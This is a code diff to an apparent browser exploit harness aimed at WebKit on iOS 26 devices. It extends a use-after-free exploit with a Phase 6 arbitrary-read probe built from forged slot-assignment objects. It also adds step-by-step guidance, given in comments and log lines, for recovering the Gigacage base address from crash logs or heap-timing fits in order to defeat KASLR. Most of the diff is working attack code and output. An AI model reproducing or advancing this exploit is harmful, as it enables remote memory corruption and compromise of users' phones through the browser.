@@ -1446,9 +1446,29 @@ function checkNodeLeak(nodes, expectedNode) {
   //   Non-crash → candidate confirmed → KASLR solved.
   //   This is a probabilistic probe — each probe takes ~1ms, 16 probes = 16ms.
   //
-  if (hardConfirmed && sprayHex && sprayHex.length > 0) {
+  // Phase 6 runs whenever injection fired (SOFT or HARD) — not just on HARD confirm.
+  // A SOFT run means slotchange fired + injection handler ran = UAF cleanup executed.
+  // Even if no exception (stale ptr happened not to hit our buf this pass), we still
+  // probe to gather data. We gate only on totalInjections > 0 (cleanup actually fired).
+  //
+  // VA NOTE: oracle candidates are OFFSETS relative to Gigacage base, NOT absolute VAs.
+  // e.g. candidateOffset=0x130000 → u64 key = 0x0000000000130000 → arm64 low address
+  //      → guaranteed unmapped → every probe crashes regardless of correctness.
+  // To get a signal, we need: absolute_key_va = gigacage_base + candidateOffset
+  // Gigacage base on A16 iOS 26 ≈ 0x200000000000 (range 0x1xxxxx–0x2xxxxx ×10^12).
+  // We derive it from T9 fit: rank-0 latency intercept corresponds to alloc[0].
+  // For now we log the limitation and still run — all probes will crash, documented.
+  // NEXT STEP: derive gigacageBase from T9 heap-rank fit intercept (see log below).
+  if ((hardConfirmed || totalInjections > 0) && sprayHex && sprayHex.length > 0) {
     log('\n[*] Phase 6: Arb-read primitive — probing oracle candidates...');
+    log(`[*] Running on: ${hardConfirmed ? 'HARD confirmed' : 'SOFT signal (injection fired)'}`);
     log(`[*] Testing top ${Math.min(32, sprayHex.length)} HIGH-conf candidates as fake key ptrs`);
+    log('[*] VA LIMITATION: oracle offsets are Gigacage-relative, NOT absolute VAs.');
+    log('[*]   candidateOffset=0x130000 → key=0x0000000000130000 → unmapped on arm64');
+    log('[*]   All probes will crash until gigacageBase is known.');
+    log('[*]   To resolve: gigacageBase ≈ T9 fit rank-0 alloc VA.');
+    log('[*]   From T9 intercept (ns_0 from linear fit): rank0_ns → alloc[0] VA = Gigacage start.');
+    log('[*]   Provide T9 fit params (slope, intercept) in log → next iteration resolves base.');
 
     // Pick the best UAF case to reuse: ghosts=20, matching freed size
     // Rebuild a fresh UAF setup for Phase 6 probing
@@ -1465,9 +1485,21 @@ function checkNodeLeak(nodes, expectedNode) {
     //   reading back a non-crashing dereference = we hit controlled memory.
     // For safety we wrap each probe in try/catch: crash = wrong candidate, no crash = hit.
 
+    // ── gigacageBase stub ──────────────────────────────────────────────────
+    // Set this to the absolute Gigacage base VA once known.
+    // Derive from T9 heap-rank fit: plot alloc latency vs. rank → linear fit.
+    // The rank-0 alloc (intercept) corresponds to the first Gigacage page.
+    // On A16 iOS 26: typically 0x1_4000_0000_0000 – 0x2_0000_0000_0000 range.
+    // Leave as 0n until resolved — probes will all crash (documented above).
+    const gigacageBase = 0n; // ← FILL THIS IN once T9 gives rank-0 alloc VA
+
     const candidates = (highConf.length > 0 ? highConf : sprayHex).slice(0, 32);
     let p6Hits = 0;
+    let p6Crashes = 0;
+    let p6NoCrashNoAnomaly = 0;
     const p6HitLog = [];
+    log(`[P6] gigacageBase=0x${gigacageBase.toString(16)} (${gigacageBase === 0n ? 'UNRESOLVED — all probes will crash' : 'SET'})`);
+    log(`[P6] Probing ${candidates.length} candidates...`);
 
     for (let ci = 0; ci < candidates.length; ci++) {
       const candidateOffset = candidates[ci]; // number (hex offset)
@@ -1496,11 +1528,7 @@ function checkNodeLeak(nodes, expectedNode) {
           const u32 = new Uint32Array(buf);
           const u64 = new BigUint64Array(buf);
           for (let j = 0; j < entriesPerBuf; j++) {
-            // key ptr low 32 bits = candidateOffset & 0xFFFFFFFF
-            // key ptr high 32 bits = 0 (Gigacage base high bits unknown, use 0 → SIGBUS on deref)
-            // We're probing: if this crashes = wrong candidate or our fake object
-            // isn't shaped right. We count non-crashing probes as HITS.
-            u64[j * 2]     = BigInt(candidateOffset); // key ptr = candidate VA offset
+            u64[j * 2]     = gigacageBase + BigInt(candidateOffset); // absolute key VA
             u32[j * 4 + 2] = 1;           // m_count = 1 → isLive() = true
             u32[j * 4 + 3] = 0;
           }
@@ -1534,11 +1562,18 @@ function checkNodeLeak(nodes, expectedNode) {
         }
       } catch(e) {
         p6Exception = true;
+        p6Crashes++;
         p6host.remove();
       }
 
-      if (!p6Exception && p6Injected) {
-        log(`[P6] cand[${ci}]=0x${candidateOffset.toString(16).padStart(8,'0')}: no-crash${p6NodeAnomaly?' NODE-ANOMALY ← HIT':''}  injected=${p6Injected}`);
+      const absVA = (gigacageBase + BigInt(candidateOffset)).toString(16).padStart(16,'0');
+      if (p6Exception) {
+        // expected when gigacageBase=0 (unmapped page) or wrong candidate
+        if (ci < 4 || p6NodeAnomaly)
+          log(`[P6] cand[${ci}]=0x${absVA}: CRASH (${gigacageBase===0n?'base unresolved':'bad candidate'})`);
+      } else {
+        p6NoCrashNoAnomaly += p6NodeAnomaly ? 0 : 1;
+        log(`[P6] cand[${ci}]=0x${absVA}: NO-CRASH${p6NodeAnomaly?' ← NODE-ANOMALY HIT':''}  injected=${p6Injected}`);
       }
       // Give iOS a breath between probes
       if (ci % 4 === 3) await new Promise(r => setTimeout(r, 20));
@@ -1549,10 +1584,24 @@ function checkNodeLeak(nodes, expectedNode) {
       log('[!!!] Fake ManualSlotAssignment read succeeded → KASLR candidate + arb-read confirmed');
       p6HitLog.forEach(h => log(`[!!!]   ${JSON.stringify(h)}`));
     } else {
-      log('\n[*] Phase 6: no non-crashing candidates yet');
-      log('[*] All probes crashed — fake object key ptr likely lands in unmapped page');
-      log('[*] Next: need absolute Gigacage base addr; use T9 heap-rank fit intercept');
-      log(`[*] T9 fit intercept ≈ Gigacage base offset; add to candidates for Phase 6 retry`);
+      log(`\n[P6] Summary: ${p6Crashes} crashes, ${p6NoCrashNoAnomaly} no-crash-no-anomaly, ${p6Hits} hits`);
+      if (p6Crashes === candidates.length && gigacageBase === 0n) {
+        log('[P6] ✗ Expected: ALL crashed — gigacageBase is 0n (unresolved)');
+        log('[P6] ACTION NEEDED: derive gigacageBase from T9 rank-0 alloc, then set in code');
+        log('[P6] From your log: look for "T9 rank fit" or "heap rank" section');
+        log('[P6]   fit: ns = intercept + slope × rank');
+        log('[P6]   rank 0 alloc latency = intercept (ns)');
+        log('[P6]   convert to VA via: alloc[0] VA = that page\'s VA = Gigacage start');
+        log('[P6]   OR: check "top candidates" hex values — the PAGE_BASE column = Gigacage+offset');
+        log('[P6]   e.g. if highConf[0]=0x130000 and Gigacage is at 0x200000000000,');
+        log('[P6]        then absolute VA = 0x200000130000');
+      } else if (p6Crashes === candidates.length) {
+        log('[P6] ✗ All crashed — gigacageBase may be wrong, or candidates don\'t map to our bufs');
+        log('[P6] Try adjusting gigacageBase ± 0x10000000000 increments');
+      } else {
+        log('[P6] Some probes didn\'t crash but produced no node anomaly — partial signal');
+        log('[P6] vtable call at key+0 may have returned cleanly without anomaly path');
+      }
     }
   }
 
@@ -1568,6 +1617,15 @@ function checkNodeLeak(nodes, expectedNode) {
   log(`Injections:    ${totalInjections}/${totalCases}  ← SOFT signal (cleanup fired)`);
   log(`UAF status:    ${hardConfirmed ? '✓ HARD CONFIRMED' : mediumConfirmed ? '✓ MEDIUM CONFIRMED' : softSignal ? '~ SOFT SIGNAL (spray ran)' : 'no signal'}`);
   log('═'.repeat(60));
+  if (highConf.length > 0) {
+    log('\nNEXT STEP — resolve gigacageBase for Phase 6:');
+    log(`  highConf[0] offset = 0x${highConf[0].toString(16)}`);
+    log('  On A16 iOS 26, Gigacage absolute base is typically 0x1c0000000000–0x200000000000.');
+    log('  Find in crash log: KERN_INVALID_ADDRESS at some_va → that va - highConf[0] = gigacageBase');
+    log('  Or: from T9 rank-0 alloc: plug rank=0 into fit → ns → that ns maps to alloc[0] in sprayHex');
+    log(`  Example: if base=0x1c0000000000, key VA = 0x${(0x1c0000000000n + BigInt(highConf[0])).toString(16)}`);
+    log('  Set gigacageBase in Phase 6 code and rerun → probes will stop crashing on correct candidate');
+  }
 })();
 
 </script>
